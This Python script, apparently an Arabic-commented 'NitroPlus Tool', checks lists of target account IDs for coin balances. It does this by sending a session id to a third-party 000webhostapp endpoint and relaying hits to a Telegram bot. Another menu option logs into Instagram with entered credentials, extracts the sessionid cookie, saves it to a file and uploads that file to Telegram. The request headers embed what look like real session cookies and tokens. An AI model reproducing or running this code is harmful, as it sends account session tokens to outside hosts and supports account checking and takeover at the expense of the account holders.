import os,time,sys
from time import sleep
try:
    import user_agent
except:
    os.system('pip install user_agent')
try:
    import datetime
except:
    os.system('pip install datetime')
try:
    import requests
except:
    os.system('pip install requests')
A = '\033[2;34m'#ازرق
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;34m'#ازرق
C = '\033[2;35m' #وردي
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ا
J = "\033[1;97m" #ابيض
def va():
	va = f'''   
	  \033[2;32m             NitroPlus Tool\n 
	
{B}	Dev	: HakuXr   Canal : @HakuExe
                                         
                                         '''
	
	sleep(0.05)	
	for va in va.splitlines():
		sleep(0.05)
		print(va)
va()

import requests,user_agent,os
from user_agent import generate_user_agent
from datetime import datetime
from requests import *
def jalan(z):
 for e in z + '\n':
  sys.stdout.write(e)
  sys.stdout.flush()
  time.sleep(0.02)
jalan(f'''{F}ㅤㅤ1: {X}Check By Combo \n{F}ㅤㅤ2: {X}Auto Check\n{F}ㅤㅤ3: {X}Extract Sessionid Account\n {F} ㅤ4:{X} Auto Trans (Not Work) ''')
bw = input(f"\n{F}ㅤㅤ[{J}+{F}] {Z}Choose :")
if bw =='1':
    os.system('clear')
    sis = input(f'{J} +ㅤㅤ {F}Enter Session Id : ')
    filn = input(f'{J} +ㅤㅤ {F}Enter Combo Name Id : ')
    token = input(f'{J} +ㅤㅤ {F}Enter Your  Token Tell : ')
    ID = input(f'{J} + ㅤㅤ {F}Enter Your ID  Tell :')
    file = open(f"{filn}","r").read().splitlines()
    for ac in file:
        if not ac:
            continue
        try:
            idd = ac
            v = get(f"https://sidra3.000webhostapp.com/check.php?target={idd}&sessionid={sis}&submit=submit").text
            g = v.split('{"coins":"')[1]
            c = g.split('"}')[0]
            cc = c
            num = "150"
            if c >= num:
                 print(F+f"ㅤㅤㅤㅤId  {idd}\n Coins {Z} {c}")
                 post(f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= ID = {idd}\nCoins In Id => {c}\nBy => @HakuExe ''')
                 print(X+"="*10)
                    
            else:
                print(F+f"ㅤㅤㅤㅤId  {idd}\nCoins   {B}{c}")
                
        except requests.exceptions.ConnectionError:
    	           print('Api does not work. !\nor Your internet is so bad. !')
if bw =='2':
    os.system('clear')
    while True:
            idd = input(F+f"Enter ID Target In Nitro : {Z}")
            sis = input(F+f"Enter  Sessionid  : {Z}")
            try:
                v = get(f"https://sidra3.000webhostapp.com/check.php?target={idd}&sessionid={sis}&submit=submit").text
                g = v.split('{"coins":"')[1]
                c = g.split('"}')[0]
                num = "150"
                if c >= num:
                 print(F+f"ㅤㅤㅤㅤId  {idd}\n Coins :{Z} {c}")
                 
                    
                else:
                    print(F+f"Id => {idd}\nCoin is => {B}{c}")
                
            except requests.exceptions.ConnectionError:
    	           print('Api does not work. !\nor Your internet is so bad. !')
if bw == '3':
    os.system('clear')
    while True:
        userr = input(B+f'Enter username => {Z}')
        pas = input(B+f'Enter password => {Z}')
        
        url = 'https://www.instagram.com/accounts/login/ajax/'
        Headers = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'ar,en-US;q=0.9,en;q=0.8','content-length': '385','content-type': 'application/x-www-form-urlencoded','cookie': 'mid=YiNDbwALAAHloyK8S59Xs3XDLabd; ig_did=9FACA874-80BE-45PrWcWBvSAXGj8bD2EAcwLJEf6Bkfw9Y1EknVsZCggqiNixWMwTX9HNJQ24FVfuLa4t8eXt1HPA1iUitADJLCoS5ua3WQR\0542128710131\0541682210436:01f7ae827a1dfd2afd29d87081c4b6fcfcd7d69ac63489b22b379109f617f21e3ab951f3"; shbts="1650674436\0542128710131\0541682210436:01f706ba04ce9a92a6957907ede1c5b5cf6da47433d1a5eacfa10f47cf26e8a89db1079b"; csrftoken=3Iz5CjmeHnmFWnSvtGSwOkF42GLMngNX; fbsr_124024574287414=sNIow6DXyx1ZYhd6J16RNaJNWd7mscEsZvlkyJqA2oU.eyJ1c2VyX2lkIjoiMTAwMDExMDI5MTQ2MjgwIiwiY29kZSI6IkFRRHRuX0liU001Z0FhX3RNV1hMZG1DMkdNQXU0cW1oVGl3UnNmVFJjSE9BSmxWZWFZdWlWNEQxT0pXZlY1OTJLTUhnMXBzcTZmTS1IWjlxcC1xalZTellLOEt5X3VFUkNaUWx2THFxN0pmSG1nbnJwbXV6b1pNRzZLVUlaMEU5Y0plU0NTdXA3Y1FiT1lQdTN2SnhoaXE4VU1ZaE1mWXhCb2NqdXkyZ0N1cktMRVNiYUQ3OU5GeFFjajY2MG1LeGxvQkpzY3YtekVpNjR6YVF3dzZtZ3Nhbjg4WVhlWlFZWjhPblNTSHB6OThFR25uZlJVanJhNVE2cVRHZ3hoUWdJMENmWWpZTXRSVDVhOXhoTFhCVFNoOXJsV1VmRXBPX1ZOTC1NM1NPM1RlOU9kRTlGN091aVVSQVc0UkFRWGt3emoybjlGRkg2UTZ3OG93OVJrZ1hEUTBPIiwib2F1dGhfdG9rZW4iOiJFQUFCd3pMaXhuallCQUpicmtyOHM0SnQ3OE9FelZjNnVEZ2Z6WkNudlVxNzIzaDZLVElLcVpDVXdmaUJydlk3Zlc1VzdmdTNvZGFuMFFJZGIzaWNBYlRKeHAyYjFXZWNRakdPeGZCODdCaVlza0tCMlpCU3dLWFVWb1MxaW4wWkFHelM0WkFMRGk2OUw3WFBjcnVCY3RaQ1pDUGdzSXlPT2xaQlpBd1h4bkIwV252ZlpCNUdpNkFodkYxIiwiYWxnb3JpdGhtIjoiSE1BQy1TSEEyNTYiLCJpc3N1ZWRfYXQiOjE2NTEwMDk5NDl9','dnt': '1','origin': 'https://www.instagram.com','referer': 'https://www.instagram.com/''sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(),'x-asbd-id': '198387','x-csrftoken': '3Iz5CjmeHnmFWnSvtGSwOkF42GLMngNX','x-ig-app-id': '936619743392459','x-ig-www-claim': '0','x-instagram-ajax': '20e2a5e214f4','x-requested-with': 'XMLHttpRequest'}
        time_now = int(datetime.now().timestamp())
        data = {'enc_password': '#PWD_INSTAGRAM_BROWSER:0:{time_now}:'+pas,'username':userr,'queryParams': '{}','optIntoOneTap': False,'stopDeletionNonce': "",'trustedDeviceRecords': '{}'}
        req = requests.post(url,headers=Headers,data=data)
        if 'userId'in req.text:
    	    print(F+"Login succeeded !")
    	    session_id = req.cookies['sessionid']
    	    print(F+f"Your Sessionid is =>{Z} {session_id}")
    	    Idy= session_id.split('%')[0]
    	    SI = f'Your sessionid Is => {session_id}\nID => {Idy}\nBy => @SidraTools '
    	    tok = input(B+f"Enter Your Token => {Z}")
    	    Iy = input(B+f"Enter ID In Tell => {Z}")
    	    
    	    open("session_id.txt", "a").write(f"{SI}\n")
    	    tlg = f'https://api.telegram.org/bot{tok}/sendDocument?chat_id={Iy}&caption=➥ • DONE GET SESSIONID\n\n➥• @SidraTools , •@tt_rq'
    	    files = {'document' :open('session_id.txt','rb')}
    	    post(tlg,files=files)

        else:
    	    print(Z+f"Erorr Login. !\n{B}Login Again ")